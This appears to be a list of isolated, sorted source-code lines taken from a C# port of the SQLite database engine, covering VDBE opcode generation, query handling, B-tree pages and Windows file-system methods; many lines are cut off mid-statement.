"      sqlite3Put4byte(pPage1.aData, 36, nFree "
"      sqlite3Put4byte(pParent.aData, pRight, apNew[nNew - 1].pgno)"
"      sqlite3Put4byte(pRoot.aData, pRoot.hdrOffset "
"      sqlite3ReleaseTempRange( pParse, regBase, nCol "
"      sqlite3ReleaseTempRange( pParse, regBase, nExpr "
"      sqlite3ReleaseTempReg( pParse, iReleaseReg )"
"      sqlite3ReleaseTempReg( pParse, r1 )"
"      sqlite3ReleaseTempReg( pParse, regData )"
"      sqlite3ReleaseTempReg( pParse, regFree1 )"
"      sqlite3ReleaseTempReg( pParse, regFree2 )"
"      sqlite3ReleaseTempReg( pParse, regRecord )"
"      sqlite3ReleaseTempReg( pParse, regRow )"
"      sqlite3ReleaseTempReg( pParse, regRowid )"
"      sqlite3ResetInternalSchema( db, 0 )"
"      sqlite3ResolveOrderGroupBy( pParse, p, p.pOrderBy, ""ORDER"" )"
"      sqlite3ResolveSelectNames( pParse, p, pOuterNC )"
"      sqlite3RunParser( pParse, zSql, ref zErrMsg )"
"      sqlite3Select( pParse, p, ref destB )"
"      sqlite3Select( pParse, pDup, ref dest )"
"      sqlite3Select( pParse, pPrior, ref destA )"
"      sqlite3SelectAddTypeInfo( pParse, p )"
"      sqlite3SelectDelete( db, ref p.pPrior )"
"      sqlite3SelectDelete( db, ref pDelete )"
"      sqlite3SelectDelete( db, ref pDup )"
"      sqlite3SelectDelete( db, ref pSelect )"
"      sqlite3SelectDelete( db, ref pSub )"
"      sqlite3SelectDelete( db, ref pSub1 )"
"      sqlite3SelectDelete( db, ref pSubquery )"
"      sqlite3SelectDelete( db, ref pTable.pSelect )"
"      sqlite3SelectDestInit( dest, SRT_EphemTab, iCur )"
"      sqlite3SelectDestInit( destA, SRT_Coroutine, regAddrA )"
"      sqlite3SelectDestInit( destB, SRT_Coroutine, regAddrB )"
"      sqlite3SelectExpand( pParse, p )"
"      sqlite3SelectPrep( pParse, p, null )"
"      sqlite3SelectPrep( pParse, pSelect, null )"
"      sqlite3SetString( ref p.zErrMsg, db, ""out of memory"" )"
"      sqlite3SetString( ref p.zErrMsg, db, ""string or blob too big"" )"
"      sqlite3SetString( ref p.zErrMsg, db, sqlite3ErrStr( rc ) )"
"      sqlite3SetString( ref sz, db, zFormat, ap )"
"      sqlite3SrcListAssignCursors( pParse, pTabList )"
"      sqlite3SrcListDelete( db, ref p.pSrc )"
"      sqlite3SrcListDelete( db, ref pName )"
"      sqlite3SrcListDelete( db, ref pSrc )"
"      sqlite3SrcListDelete( db, ref pTabList )"
"      sqlite3SrcListDelete( db, ref pTableName )"
"      sqlite3SrcListDelete( db, ref pTblName )"
"      sqlite3StartTable( pParse, pName1, pName2, isTemp, 1, 0, noErr )"
"      sqlite3StatusSet( SQLITE_STATUS_MALLOC_SIZE, n )"
"      sqlite3StrAccumInit( acc, zBase, n, 0 )"
"      sqlite3StrAccumInit( acc, zBase, zBase.Capacity, //zBase).Length"
"      sqlite3StrAccumInit( acc, zBase, zBase.Length, SQLITE_PRINT_BUF_SIZE )"
"      sqlite3StrAccumInit( acc, zBuf, zBuf.Capacity, 0 )"
"      sqlite3StrAccumInit(sCheck.errMsg, zErr, zErr.Capacity, 20000)"
"      sqlite3Strlen30( zName ), null )"
"      sqlite3Strlen30( zTabName ), null )"
"      sqlite3TableAffinityStr( v, pTab )"
"      sqlite3TableLock( p, iDb, MASTER_ROOT, 1, SCHEMA_TABLE( iDb ) )"
"      sqlite3TableLock( p, iDb, pTab.tnum, ( opcode == OP_OpenWrite ) "
"      sqlite3TableLock( pParse, iDb, pTab.tnum, 0, pTab.zName )"
"      sqlite3TableLock( pParse, iDb, pTab.tnum, 1, pTab.zName )"
"      sqlite3TransferBindings( pNew, (sqlite3_stmt)p )"
"      sqlite3TwoPartName( pParse, pName1, pName2, ref pName )"
"      sqlite3VXPrintf( acc, 0, zFormat, ap )"
"      sqlite3VXPrintf( acc, 1, zFormat, ap )"
"      sqlite3VXPrintf(pCheck.errMsg, 1, zFormat, ap)"
"      sqlite3VdbeAddOp0( p, OP_Noop )"
"      sqlite3VdbeAddOp1( v, OP_Close, iIdx )"
"      sqlite3VdbeAddOp1( v, OP_Close, iTab )"
"      sqlite3VdbeAddOp1( v, OP_Return, regReturn )"
"      sqlite3VdbeAddOp1( v, OP_Yield, regAddrA )"
"      sqlite3VdbeAddOp1( v, OP_Yield, regAddrB )"
"      sqlite3VdbeAddOp2( v, OP_AutoCommit, 0, 0 )"
"      sqlite3VdbeAddOp2( v, OP_Close, iCur, 0 )"
"      sqlite3VdbeAddOp2( v, OP_Close, iDest, 0 )"
"      sqlite3VdbeAddOp2( v, OP_Close, iSrc, 0 )"
"      sqlite3VdbeAddOp2( v, OP_ContextPop, 0, 0 )"
"      sqlite3VdbeAddOp2( v, OP_ContextPush, 0, 0 )"
"      sqlite3VdbeAddOp2( v, OP_Delete, iCur, ( count > 0 "
"      sqlite3VdbeAddOp2( v, OP_Expire, 1, 0 )"
"      sqlite3VdbeAddOp2( v, OP_Gosub, regAddrA, addrSelectA )"
"      sqlite3VdbeAddOp2( v, OP_Gosub, regAddrB, addrSelectB )"
"      sqlite3VdbeAddOp2( v, OP_Goto, 0, addr )"
"      sqlite3VdbeAddOp2( v, OP_Goto, 0, labelCmpr )"
"      sqlite3VdbeAddOp2( v, OP_IdxInsert, iIdx, regRecord )"
"      sqlite3VdbeAddOp2( v, OP_IdxInsert, iTab, r1 )"
"      sqlite3VdbeAddOp2( v, OP_IdxInsert, pOrderBy.iECursor, regRecord )"
"      sqlite3VdbeAddOp2( v, OP_If, regEofA, addrEofA )"
"      sqlite3VdbeAddOp2( v, OP_If, regEofB, addrEofB )"
"      sqlite3VdbeAddOp2( v, OP_Integer, 0, regEofA )"
"      sqlite3VdbeAddOp2( v, OP_Integer, 0, regEofB )"
"      sqlite3VdbeAddOp2( v, OP_Integer, 1, regEofA )"
"      sqlite3VdbeAddOp2( v, OP_Integer, 1, regEofB )"
"      sqlite3VdbeAddOp2( v, OP_Integer, db.aDb[iDb].pSchema.schema_cookie "
"      sqlite3VdbeAddOp2( v, OP_Next, iSrc, addr1 )"
"      sqlite3VdbeAddOp2( v, OP_Next, iTab, addr )"
"      sqlite3VdbeAddOp2( v, OP_Next, iTab, addr1 "
"      sqlite3VdbeAddOp2( v, OP_Null, 0, regOldRowid )"
"      sqlite3VdbeAddOp2( v, OP_ResultRow, mem, 1 )"
"      sqlite3VdbeAddOp2( v, OP_RowData, iSrc, regData )"
"      sqlite3VdbeAddOp2( v, OP_Rowid, iCur, regBase "
"      sqlite3VdbeAddOp2( v, OP_Rowid, iCur, regOldRowid )"
"      sqlite3VdbeAddOp2( v, OP_Sequence, pOrderBy.iECursor, regBase "
"      sqlite3VdbeAddOp3( pParse.pVdbe, OP_Move, iFrom, iTo, nReg )"
"      sqlite3VdbeAddOp3( v, OP_Column, iTab, pOrderBy.nExpr "
"      sqlite3VdbeAddOp3( v, OP_Destroy, iTable, r1, iDb )"
"      sqlite3VdbeAddOp3( v, OP_Found, iTab, addrRepeat, r1 )"
"      sqlite3VdbeAddOp3( v, OP_Insert, baseCur, regRec, regRowid )"
"      sqlite3VdbeAddOp3( v, OP_Insert, iDest, regData, regRowid )"
"      sqlite3VdbeAddOp3( v, OP_Jump, addrAltB, addrAeqB, addrAgtB )"
"      sqlite3VdbeAddOp3( v, OP_MakeRecord, iMem, N, r1 )"
"      sqlite3VdbeAddOp3( v, OP_MakeRecord, regBase, nExpr "
"      sqlite3VdbeAddOp3( v, OP_MakeRecord, regData, pTab.nCol, regRec )"
"      sqlite3VdbeAddOp3( v, OP_OpenWrite, 0, MASTER_ROOT, iDb )"
"      sqlite3VdbeAddOp3( v, OP_OpenWrite, iStatCur, iRootPage, iDb )"
"      sqlite3VdbeAddOp3( v, OP_SetCookie, iDb, BTREE_SCHEMA_VERSION, r1 )"
"      sqlite3VdbeAddOp3( v, opcode, iCur, pTab.tnum, iDb )"
"      sqlite3VdbeAddOp4( v, OP_Compare, destA.iMem, destB.iMem, nOrderBy,"
"      sqlite3VdbeAddOp4( v, OP_DropTable, iDb, 0, 0, pTab.zName, 0 )"
"      sqlite3VdbeAddOp4( v, OP_Int64, 0, mem, 0, value, P4_INT64 )"
"      sqlite3VdbeAddOp4( v, OP_OpenWrite, iIdx, tnum, iDb,"
"      sqlite3VdbeAddOp4( v, OP_ParseSchema, iDb, 0, 0, zWhere, P4_DYNAMIC )"
"      sqlite3VdbeAddOp4( v, OP_Permutation, 0, 0, 0, aPermute, P4_INTARRAY )"
"      sqlite3VdbeAddOp4(v, OP_VUpdate, 1, pTab->nCol"
"      sqlite3VdbeChangeEncoding( pMem, enc )"
"      sqlite3VdbeChangeP2( p, addr, p.nOp )"
"      sqlite3VdbeChangeP4( p, addr, _p4, P4_DYNAMIC )"
"      sqlite3VdbeChangeP4( p, addr, _p4, n )"
"      sqlite3VdbeChangeP4( p, addr, _p4, p4type )"
"      sqlite3VdbeChangeP4( v, -1, ( pTab.nCol ), P4_INT32 )"
"      sqlite3VdbeChangeP4( v, -1, (int)3, P4_INT32 )"
"      sqlite3VdbeChangeP4( v, -1, (int)5, P4_INT32 )"
"      sqlite3VdbeChangeP4( v, -1, pDest.zName, 0 )"
"      sqlite3VdbeChangeP4( v, -1, pIdx.zColAff, 0 )"
"      sqlite3VdbeChangeP4( v, -1, pTab.zColAff, 0 )"
"      sqlite3VdbeChangeP5( pParse.pVdbe, (u8)p5 )"
"      sqlite3VdbeChangeP5( v, OPFLAG_NCHANGE "
"      sqlite3VdbeChangeP5( v, OPFLAG_USESEEKRESULT )"
"      sqlite3VdbeChangeP5( v, createStat1 )"
"      sqlite3VdbeChangeP5( v, pik_flags )"
"      sqlite3VdbeJumpHere( v, addr )"
"      sqlite3VdbeJumpHere( v, addr1 )"
"      sqlite3VdbeJumpHere( v, emptySrcTest )"
"      sqlite3VdbeJumpHere( v, j1 )"
"      sqlite3VdbeMemCopy( pCtx.s, pValue )"
"      sqlite3VdbeMemSetDouble( pCtx.s, rVal )"
"      sqlite3VdbeMemSetInt64( pCtx.s, (i64)iVal )"
"      sqlite3VdbeMemSetInt64( pCtx.s, iVal )"
"      sqlite3VdbeMemSetZeroBlob( pCtx.s, n )"
"      sqlite3VdbeResolveLabel( v, addrBreak )"
"      sqlite3VdbeResolveLabel( v, addrContinue )"
"      sqlite3VdbeResolveLabel( v, endOfLoop )"
"      sqlite3VdbeResolveLabel( v, iContinue )"
"      sqlite3VdbeResolveLabel( v, iEnd )"
"      sqlite3VdbeResolveLabel( v, labelCmpr )"
"      sqlite3VdbeResolveLabel( v, labelEnd )"
"      sqlite3VdbeResolveLabel( v, pWInfo.iBreak )"
"      sqlite3VdbeSerialGet( m.zBLOB, (int)( m.n - lenRowid ), typeRowid, v )"
"      sqlite3VdbeSetColName( v, 0, COLNAME_NAME, zLabel, SQLITE_STATIC )"
"      sqlite3VdbeSetNumCols( v, 1 )"
"      sqlite3VdbeSetNumCols( v, pEList.nExpr )"
"      sqlite3VdbeSwap( (Vdbe)pNew, p )"
"      sqlite3VtabMakeWritable(pParse, pTab)"
"      sqlite3WalkExpr( w, ref p )"
"      sqlite3WalkExpr( w, ref pExpr )"
"      sqlite3WalkSelect( w, p )"
"      sqlite3WalkSelect( w, pSelect )"
"      sqlite3_backup_step( b, 0x7FFFFFFF )"
"      sqlite3_config( SQLITE_CONFIG_MALLOC, defaultMethods )"
"      sqlite3_config( SQLITE_CONFIG_PCACHE, defaultMethods )"
"      sqlite3_query_plan.sValue = """""
"      sqlite3_randomness( sizeof( i64 ), ref i64Temp )"
"      sqlite3_randomness( sizeof( sqlite_int64 ), ref r )"
"      sqlite3_result_double( context, p != null "
"      sqlite3_result_error( context, zErr, -1 )"
"      sqlite3_result_int( context, sqlite3_changes( db ) )"
"      sqlite3_result_int( context, sqlite3_total_changes( db ) )"
"      sqlite3_result_int64( context, p != null "
"      sqlite3_result_int64( context, r )"
"      sqlite3_result_int64( context, sqlite3_last_insert_rowid( db ) )"
"      sqlite3_result_text( context, sb.ToString(), nIn, SQLITE_TRANSIENT )"
"      sqlite3_result_text( context, sqlite3_version, -1, SQLITE_STATIC )"
"      sqlite3_result_text( context, z, -1, SQLITE_STATIC )"
"      sqlite3_result_text(context, zOut, j, null)"
"      sqlite3_result_value( context, argv[iBest] )"
"      sqlite3_snprintf( 999, ref zOut, zFormat1, pc,"
"      sqlite3_snprintf(200, ref zContext, ""Page %d: "", iPage)"
"      sqlite3_status( SQLITE_STATUS_MEMORY_USED, ref n, ref mx, 0 )"
"      sqlite3_vfs pNext,"
"      sqlite3_vfs_register( winVfs, 1 )"
"      sqliteViewResetAll( db, iDb )"
"      sqlite_int64 val = sqlite3_value_int64( columnMem( pStmt, i ) )"
"      static extern bool LockFileEx( IntPtr hFile, uint dwFlags, uint dwReserved,"
"      storeTypeInfo( pMem, 0 )"
"      string Errors = """""
"      string dummy = """""
"      string sz = """""
"      string tmp = """""
"      string val = sqlite3_value_text( columnMem( pStmt, i ) )"
"      string z = """""
"      string z, zDb"
"      string zA, zB"
"      string zBuf = """""
"      string zContext = """""
"      string zCsr = """""
"      string zErr = """""
"      string zErrDyn = """""
"      string zErrMsg = """""
"      string zErrmsg = """""
"      string zFormat1 = ""%4d %-13s %4d %4d %4d %-4s %.2X %s"
"      string zKeyText = ""naturaleftouterightfullinnercross"""
"      string zLeftover = """""
"      string zName = sqlite3NameFromToken( pParse.db, pName )"
"      string zName,"
"      string zOut = """""
"      string zSql = """""
"      string zText = ""onoffalseyestruefull"""
"      string zVal = """""
"      string zWhere = """""
"      string[] azName =  { """
"      string[] encnames = new string[] { ""(X)"", ""(8)"", ""(16LE)"", ""(16BE)"" }"
"      substExprList( db, p.pEList, iTable, pEList )"
"      substExprList( db, p.pGroupBy, iTable, pEList )"
"      substExprList( db, p.pOrderBy, iTable, pEList )"
"      substSelect( db, p.pPrior, iTable, pEList )"
"      such a page is not even journalled (as it will not be modified,"
"      testcase( ExprHasProperty( pExpr, EP_Reduced ) )"
"      testcase( ExprHasProperty( pExpr, EP_TokenOnly ) )"
"      testcase(pc == get2byte(data, hdr "
"      the SHARED lock, the file-system is checked for a hot-journal,"
"      timeFunc( context, 0, null )"
"      top = get2byte(data, hdr "
"      u32 a, b"
"      u32 a, b, s"
"      u32 serial_type = sqlite3VdbeSerialType( pMem, file_format )"
"      u8 result = sqlite3GetVarint32( p, 0, ref u32_v )"
"      u8 result = sqlite3GetVarint32( p, offset, ref u32_v )"
"      u8[] delays = new u8[] { 1, 2, 5, 10, 15, 20, 25, 25, 25, 50, 50, 100 }"
"      u8[] iValue = new u8[] { 1, 0, 0, 0, 1, 1, 2 }"
"      u8[] totals = new u8[] { 0, 1, 3, 8, 18, 33, 53, 78, 103, 128, 178, 228 }"
"      uint nNumberOfBytesToLockLow, uint nNumberOfBytesToLockHigh,"
"      vaFORMAT = """""
"      va_start( ap, """" )"
"      va_start( ap, ""op"" )"
"      va_start( ap, null )"
"      va_start( ap, zFormat )"
"      va_start(ap, zFormat)"
"      val = sqlite3_value_blob( columnMem( pStmt, i ) )"
"      was opened, and"
"      whereClauseInit( pOrWc, pWC.pParse, pMaskSet )"
"      whereClauseInit( pWC, pParse, pMaskSet )"
"      whereInfoFree( db, pWInfo )"
"      whereSplit( pOrWc, pExpr, TK_OR )"
"      whereSplit( pWC, pWhere, TK_AND )"
"      while ( ( c = sqlite3Utf8Read( zPattern, ref zPattern ) ) != 0 )"
"      while ((pbegin = get2byte(data, addr)) < start "
"      while ((pbegin = get2byte(data, addr)) > 0)"
"      x IN (expr1,expr2,expr3)"
"      xInit = (dxInit)sqlite3OsDlSym( pVfs, handle, ref  zProc )"
"      yy_destructor(pParser, yymajor, yytos.minor)"
"      yyact = yy_find_reduce_action(yymsp[-yysize].stateno, (YYCODETYPE)yygoto)"
"      yymsp = new yymsp(ref yypParser, yypParser.yyidx)"
"      z = sqlite3NameFromToken( db, pName )"
"      z = sqlite3NameFromToken( db, pObjName )"
"      z = sqlite3VMPrintf( db, zFormat, ap )"
"      z = sqlite3_vmprintf( zFormat, ap )"
"      zBuf = sqlite3_mprintf( ""%."
"      zCol = pColDef.z.Substring( 0, pColDef.n ).Replace( """
"      zColl = sqlite3NameFromToken( db, pCollName )"
"      zColl = sqlite3NameFromToken( db, pToken )"
"      zDb, SCHEMA_TABLE( iDb ), zName, zName, zName,"
"      zLeft = sqlite3NameFromToken( db, pId )"
"      zName = sqlite3NameFromToken( db, pName )"
"      zName, sqlite3Strlen30( zName ) ) != null )"
"      zOut = zStr.Replace( zPattern, zRep )"
"      zP4 = displayP4( pOp, zPtr, 50 )"
"      zSql = ""ATTACH '' AS vacuum_db"
"      zSql = sqlite3MPrintf( db, ""SELECT idx, stat FROM %Q.sqlite_stat1"","
"      zSql = sqlite3VMPrintf( db, zFormat, ap )"
"      zStmt,"
"      zStmt.Append( ""CREATE TABLE "" )"
"      zWhere = sqlite3MPrintf( pParse.db, ""tbl_name=%Q"", zName )"
"      zeroPage(pP1, PTF_INTKEY "
"      zeroPage(pRoot, flags "
"      zeroPage(pRoot, pChild.aData[0] "
"      { //sqlite3DbMallocZero(db, sizeof("
"      { LastError = """""
"      {// p=pParse.aColCache, p"
"      {//, pCol"
"      {//, pF"
"      {//, pFunc"
"      {//, pItem"
"      {//, pListItem"
"      },"
"     ""Sorting And Searching"", pages 473-480. Addison-Wesley"
"     . 'CREATE INDEX i ON def(a, b, c)'"
"     . 'CREATE TABLE def(a, b, c)'"
"     //  memcpy(saveBuf, pParse.nVar, SAVE_SZ)"
"     1) The current writer (BtShared.pWriter) concludes its transaction, OR"
"     1. The specified column name was rowid"", ""oid"" or ""_rowid_"""
"     10,11                               reserved for expansion"
"     <journal page X, then modify it in memory>"
"     CREATE INDEX Ex2 ON Ex1(c3,c1)"
"     CREATE TABLE Ex1(c1 int, c2 int, c3 text)"
"     DELETE and the pager is in exclusive mode, the method described under"
"     Donald E. Knuth, THE ART OF COMPUTER PROGRAMMING, Volume 3:"
"     INSERT INTO t(a,b,c) ..."
"     If the pager is running in exclusive mode, this method of finalizing"
"     PagerSavepoint.iHdrOffset, or to the end of the main journal"
"     Publishing Company, Reading, Massachusetts."
"     SELECT random()%5 AS x, count("
"     SELECT sqlite_attach(x, y, z)"
"     argument bNC is true, then the SQLITE_FUNC_NEEDCOLL flag is set."
"     collation sequence: ""BINARY"""
"     data type: ""INTEGER"""
"     mode, then the journal file is synced before this field is updated."
"     of two between 512 and SQLITE_MAX_PAGE_SIZE, inclusive), and"
"     sqlite3_config(SQLITE_CONFIG_MUTEX,...)"
"     the first journal header in the file, and hence the entire journal"
"     the journal file is never used. Instead, if the journalMode is"
"     x = getVarint32( A, B )"
"     x = putVarint32( A, B )"
"     x = sqlite3GetVarint32( A, B )"
"     x IN (4,5,11)              -- IN operator with list on right-hand side"
"    ""win32"",                        /"
"    (1) the round-trip conversion real->int->real is a no-op, and"
"    (4)  The result set of the SELECT statement is """
"    (5)  The SELECT statement has no WHERE, HAVING, ORDER BY, GROUP BY,"
"    (dxAccess)winAccess,            /"
"    (dxCheckReservedLock)winCheckReservedLock,"
"    (dxClose)memjrnlClose,       /"
"    (dxClose)winClose,"
"    (dxCurrentTime)winCurrentTime,  /"
"    (dxDelete)winDelete,            /"
"    (dxDlClose)winDlClose,          /"
"    (dxDlError)winDlError,          /"
"    (dxDlOpen)winDlOpen,            /"
"    (dxDlSym)winDlSym,              /"
"    (dxFileControl)winFileControl,"
"    (dxFileSize)memjrnlFileSize, /"
"    (dxFileSize)sqlite3_fileSize,"
"    (dxFullPathname)winFullPathname,/"
"    (dxLock)winLock,"
"    (dxOpen)winOpen,                /"
"    (dxRandomness)winRandomness,    /"
"    (dxRead)memjrnlRead,         /"
"    (dxRead)winRead,"
"    (dxSectorSize)winSectorSize,"
"    (dxSleep)winSleep,              /"
"    (dxSync)memjrnlSync,         /"
"    (dxSync)winSync,"
"    (dxTruncate)memjrnlTruncate, /"
"    (dxTruncate)winTruncate,"
"    (dxUnlock)winUnlock,"
"    (dxWrite)memjrnlWrite,       /"
"    (dxWrite)winWrite,"
"    , Parse pParse //sqlite3ParserARG_PDECL           /"
"    -1, //sqlite3_file.Length,      /"
"    /  sqlite3_aggregate_count,"
"    //                                  const void pData, int nData,"
"    //                                  int nZero, int bias, int seekResult)"
"    //                              0, 0)"
"    //                          int, int, int, int, u32"
"    //                       int omitJournal, int nCache, int flags, Btree "
"    //                int argc, sqlite3_value "
"    //               int argc, const char "
"    //               int flags, int "
"    //        //sqlite3DbFree(db,ref  p)"
"    //      WRITE_UTF8(zOut, c)"
"    //      return GetProcAddress((HANDLE)pHandle, zSymbol)"
"    //      return GetProcAddressA((HANDLE)pHandle, zSymbol)"
"    //    c = sqlite3Utf8Read(zIn, (const u8"
"    //    int addr = sqlite3VdbeAddOp3(p, op, p1, p2, p3)"
"    //    memcpy(out, in, 8)"
"    //    memcpy(pBuf, pPayload, nByte)"
"    //    memcpy(pPayload, pBuf, nByte)"
"    //    memcpy(zNew, z, n)"
"    //    sqlite3VdbeChangeP4(p, addr, _p4, p4type)"
"    //    static object winDlSym(sqlite3_vfs pVfs, HANDLE pHandle, String zSymbol){"
"    //    static void winDlClose( sqlite3_vfs pVfs, HANDLE pHandle )"
"    //    zFileName = """""
"    //    zMbcsFileName = """""
"    //    zWideFileName = """""
"    //  //sqlite3_free,"
"    //  //sqlite3_free_table,"
"    //  0,     /"
"    //  0,"
"    //  Parse pParse,        /"
"    //  Select pSelect,      /"
"    //  Table pDest,         /"
"    //  UnpackedRecord pUnKey,"
"    //  Vdbe p,               /"
"    //  btreeParseCellPtr((pPage), findCell((pPage), (iCell)), (pInfo))"
"    //  byte[] pBuf,               /"
"    //  byte[] pPayload,           /"
"    //  getLastErrorMsg(nBuf, zBufOut)"
"    //  i64 intKey,"
"    //  int bPurgeable,                /"
"    //  int bias,"
"    //  int eOp,                   /"
"    //  int eTextRep, "
"    //  int eTextRep,"
"    //  int flags,              /"
"    //  int flags,"
"    //  int iTable,                          /"
"    //  int nArg,"
"    //  int nByte,                 /"
"    //  int nByte,              /"
"    //  int onError,          /"
"    //  int op,               /"
"    //  int p1,               /"
"    //  int p2,               /"
"    //  int p3,               /"
"    //  int szExtra,                   /"
"    //  int szPage,                    /"
"    //  int wrFlag,                          /"
"    //  int,"
"    //  memset(pParse.nVar, 0, SAVE_SZ)"
"    //  nByte = MultiByteToWideChar(codepage, 0, zFilename, -1, NULL,0)"
"    //  nByte = MultiByteToWideChar(codepage, 0, zFilename, -1, zMbcsFilename, nByte)"
"    //  nByte = WideCharToMultiByte(CP_UTF8, 0, zWideFilename, -1, 0, 0, 0, 0)"
"    //  nByte = WideCharToMultiByte(CP_UTF8, 0, zWideFilename, -1, zFilename, nByte,"
"    //  nByte = WideCharToMultiByte(codepage, 0, zWideFilename, -1, 0, 0, 0, 0)"
"    //  nByte = WideCharToMultiByte(codepage, 0, zWideFilename, -1, zFilename, nByte,"
"    //  nChar = MultiByteToWideChar(CP_UTF8, 0, zFilename, -1, NULL, 0)"
"    //  nChar = MultiByteToWideChar(CP_UTF8, 0, zFilename, -1, zWideFilename, nChar)"
"    //  pNew = """""
"    //  sqlite3 db,             /"
"    //  sqlite3_aggregate_context,"
"    //  sqlite3_bind_blob,"
"    //  sqlite3_bind_double,"
"    //  sqlite3_bind_int,"
"    //  sqlite3_bind_int64,"
"    //  sqlite3_bind_null,"
"    //  sqlite3_bind_parameter_count,"
"    //  sqlite3_bind_parameter_index,"
"    //  sqlite3_bind_parameter_name,"
"    //  sqlite3_bind_text,"
"    //  sqlite3_bind_text16,"
"    //  sqlite3_bind_value,"
"    //  sqlite3_bind_zeroblob,"
"    //  sqlite3_blob_bytes,"
"    //  sqlite3_blob_close,"
"    //  sqlite3_blob_open,"
"    //  sqlite3_blob_read,"
"    //  sqlite3_blob_write,"
"    //  sqlite3_busy_handler,"
"    //  sqlite3_busy_timeout,"
"    //  sqlite3_changes,"
"    //  sqlite3_clear_bindings,"
"    //  sqlite3_close,"
"    //  sqlite3_collation_needed,"
"    //  sqlite3_collation_needed16,"
"    //  sqlite3_column_blob,"
"    //  sqlite3_column_bytes,"
"    //  sqlite3_column_bytes16,"
"    //  sqlite3_column_count,"
"    //  sqlite3_column_database_name,"
"    //  sqlite3_column_database_name16,"
"    //  sqlite3_column_decltype,"
"    //  sqlite3_column_decltype16,"
"    //  sqlite3_column_double,"
"    //  sqlite3_column_int,"
"    //  sqlite3_column_int64,"
"    //  sqlite3_column_name,"
"    //  sqlite3_column_name16,"
"    //  sqlite3_column_origin_name,"
"    //  sqlite3_column_origin_name16,"
"    //  sqlite3_column_table_name,"
"    //  sqlite3_column_table_name16,"
"    //  sqlite3_column_text,"
"    //  sqlite3_column_text16,"
"    //  sqlite3_column_type,"
"    //  sqlite3_column_value,"
"    //  sqlite3_commit_hook,"
"    //  sqlite3_complete,"
"    //  sqlite3_complete16,"
"    //  sqlite3_context_db_handle,"
"    //  sqlite3_create_collation,"
"    //  sqlite3_create_collation16,"
"    //  sqlite3_create_collation_v2,"
"    //  sqlite3_create_function,"
"    //  sqlite3_create_function16,"
"    //  sqlite3_create_module,"
"    //  sqlite3_create_module_v2,"
"    //  sqlite3_data_count,"
"    //  sqlite3_db_handle,"
"    //  sqlite3_declare_vtab,"
"    //  sqlite3_enable_shared_cache,"
"    //  sqlite3_errcode,"
"    //  sqlite3_errmsg,"
"    //  sqlite3_errmsg16,"
"    //  sqlite3_exec,"
"    //  sqlite3_extended_result_codes,"
"    //  sqlite3_file_control,"
"    //  sqlite3_finalize,"
"    //  sqlite3_get_autocommit,"
"    //  sqlite3_get_auxdata,"
"    //  sqlite3_get_table,"
"    //  sqlite3_int64 iRow,"
"    //  sqlite3_interrupt,"
"    //  sqlite3_last_insert_rowid,"
"    //  sqlite3_libversion,"
"    //  sqlite3_libversion_number,"
"    //  sqlite3_limit,"
"    //  sqlite3_malloc,"
"    //  sqlite3_memory_highwater,"
"    //  sqlite3_memory_used,"
"    //  sqlite3_mprintf,"
"    //  sqlite3_next_stmt,"
"    //  sqlite3_open,"
"    //  sqlite3_open16,"
"    //  sqlite3_open_v2,"
"    //  sqlite3_overload_function,"
"    //  sqlite3_prepare,"
"    //  sqlite3_prepare16,"
"    //  sqlite3_prepare16_v2,"
"    //  sqlite3_prepare_v2,"
"    //  sqlite3_profile,"
"    //  sqlite3_progress_handler,"
"    //  sqlite3_randomness,"
"    //  sqlite3_realloc,"
"    //  sqlite3_release_memory,"
"    //  sqlite3_reset,"
"    //  sqlite3_result_blob,"
"    //  sqlite3_result_double,"
"    //  sqlite3_result_error,"
"    //  sqlite3_result_error16,"
"    //  sqlite3_result_error_code,"
"    //  sqlite3_result_error_nomem,"
"    //  sqlite3_result_error_toobig,"
"    //  sqlite3_result_int,"
"    //  sqlite3_result_int64,"
"    //  sqlite3_result_null,"
"    //  sqlite3_result_text,"
"    //  sqlite3_result_text16,"
"    //  sqlite3_result_text16be,"
"    //  sqlite3_result_text16le,"
"    //  sqlite3_result_value,"
"    //  sqlite3_result_zeroblob,"
"    //  sqlite3_rollback_hook,"
"    //  sqlite3_set_authorizer,"
"    //  sqlite3_set_auxdata,"
"    //  sqlite3_sleep,"
"    //  sqlite3_snprintf,"
"    //  sqlite3_soft_heap_limit,"
"    //  sqlite3_sql,"
"    //  sqlite3_status,"
"    //  sqlite3_step,"
"    //  sqlite3_table_column_metadata,"
"    //  sqlite3_test_control,"
"    //  sqlite3_threadsafe,"
"    //  sqlite3_total_changes,"
"    //  sqlite3_trace,"
"    //  sqlite3_update_hook,"
"    //  sqlite3_user_data,"
"    //  sqlite3_value_blob,"
"    //  sqlite3_value_bytes,"
"    //  sqlite3_value_bytes16,"
"    //  sqlite3_value_double,"
"    //  sqlite3_value_int,"
"    //  sqlite3_value_int64,"
"    //  sqlite3_value_numeric_type,"
"    //  sqlite3_value_text,"
"    //  sqlite3_value_text16,"
"    //  sqlite3_value_text16be,"
"    //  sqlite3_value_text16le,"
"    //  sqlite3_value_type,"
"    //  sqlite3_vfs_find,"
"    //  sqlite3_vfs_register,"
"    //  sqlite3_vfs_unregister,"
"    //  sqlite3_vmprintf,"
"    //  string zFilename,       /"
"    //  union_p4 _p4,         /"
"    //  void pStress,                 /"
"    //  void sqlite3ExprSetHeight(Parse pParse, Expr p)"
"    //  void sqlite3VdbeMemPrettyPrint(Mem pMem, char "
"    //  zNew = sqlite3DbMallocRaw(db, (int)n)"
"    //  zNew = sqlite3DbMallocRaw(db, n"
"    //  {nArg, SQLITE_UTF8, bNC"
"    //  {nArg, SQLITE_UTF8, flags, (void "
"    //  {nArg, SQLITE_UTF8, nc"
"    // OVERLOADS, so I don't need to rewrite parse.c"
"    // SQLITE_MMAP_HEAP_SIZE, SQLITE_POW2_MEMORY_SIZE"""
"    // is allows: SQLITE_SYSTEM_MALLOC, SQLITE_MEMDEBUG, SQLITE_MEMORY_SIZE,"
"    /// <param name=""bInteger""></param>"
"    /// <param name=""bLong""></param>"
"    /// <param name=""index""></param>"
"    /// <param name=""query""></param>"
"    //SQLITE_API SQLITE_EXPERIMENTAL int sqlite3_config(int, ...)"
"    //SQLITE_API SQLITE_EXPERIMENTAL int sqlite3_status(int op, int "
"    //SQLITE_API int sqlite3_test_control(int op, ...)"
"    //SQLITE_API void sqlite3_randomness(int N, void "
"    //SQLITE_INT_TO_PTR(arg), 0, 0, xStep,xFinal,"
"    //SQLITE_INT_TO_PTR(iArg), 0, xFunc, 0, 0, "
"    //[DllImport( ""Kernel32.dll"" )]"
"    //[StructLayout( LayoutKind.Explicit, Size = 16, CharSet = CharSet.Ansi )]"
